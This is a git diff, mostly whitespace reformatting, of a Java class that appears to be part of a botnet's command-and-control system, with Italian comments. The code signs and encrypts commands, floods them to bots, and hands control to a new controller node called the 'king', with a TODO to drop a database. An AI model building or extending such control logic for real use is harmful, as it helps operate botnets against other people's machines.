@@ -168,45 +168,41 @@ public class Commando {
 		}
 		return;
 	}
-	
-	
-	
+
 	@Async
 	public void flooding(String cmd) {
-			String msg = "";
-			String request = "";
-			// aggiungi nonce time.millis
-			Long milli = System.currentTimeMillis();
+		String msg = "";
+		String request = "";
+		// aggiungi nonce time.millis
+		Long milli = System.currentTimeMillis();
 
-			Random rand = new SecureRandom(milli.toString().getBytes());
-			Integer nounce = rand.nextInt();
+		Random rand = new SecureRandom(milli.toString().getBytes());
+		Integer nounce = rand.nextInt();
 
-			String hashIdMsg = crypto.generateSha256(nounce.toString());
+		String hashIdMsg = crypto.generateSha256(nounce.toString());
 
-			String signature = null;
-			try {
-				signature = pki.signMessageRSA(hashIdMsg);
-				msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
-				request = pki.getCrypto().encryptAES(msg);
-			} catch (InvalidKeyException | SignatureException e) {
-				e.printStackTrace();
-				System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
-			}
-			System.out.println("hash "+ hashIdMsg);
-			System.out.println("cmd "+ cmd);
-			System.out.println("signature " + signature);
-			System.out.println("msg "+msg);
-			System.out.println("request "+request);
+		String signature = null;
+		try {
+			signature = pki.signMessageRSA(hashIdMsg);
+			msg = hashIdMsg + "<HH>" + cmd + "<HH>" + signature;
+			request = pki.getCrypto().encryptAES(msg);
+		} catch (InvalidKeyException | SignatureException e) {
+			e.printStackTrace();
+			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
+		}
+		System.out.println("hash " + hashIdMsg);
+		System.out.println("cmd " + cmd);
+		System.out.println("signature " + signature);
+		System.out.println("msg " + msg);
+		System.out.println("request " + request);
 
-			startFlood(request);
+		startFlood(request);
 		return;
 	}
-	
-	
 
 	/**
-	 * @param pk 
-	 * @param ip 
+	 * @param pk
+	 * @param ip
 	 * @return
 	 */
 	public boolean newKingDns(IP ip, String pk) {
@@ -215,7 +211,7 @@ public class Commando {
 	}
 
 	public boolean newKingFlood(IP ip, String pk) {
-		String msg="newking<CC>"+ip+"<CC>"+pk;
+		String msg = "newking<CC>" + ip + "<CC>" + pk;
 		flooding(msg);
 		return false;
 	}
@@ -228,9 +224,9 @@ public class Commando {
 			System.out.println("bot dns" + b.getIp());
 			IP ip = new IP(newKing);
 			String pk = b.getPubKey();
-			newKingDns(ip,pk);
-			newKingFlood(ip,pk);
-			//TODO DropDATABASE
+			newKingDns(ip, pk);
+			newKingFlood(ip, pk);
+			// TODO DropDATABASE
 			return true;
 		}
 		return false;
@@ -267,7 +263,7 @@ public class Commando {
 				}
 				System.out.println("erection completed ");
 			} else
-				System.out.println("nessuno da eleggere");
+				System.out.println("nessuno da ereggere");
 			// elegilo passa i dati
 			// passa il potere
 		}
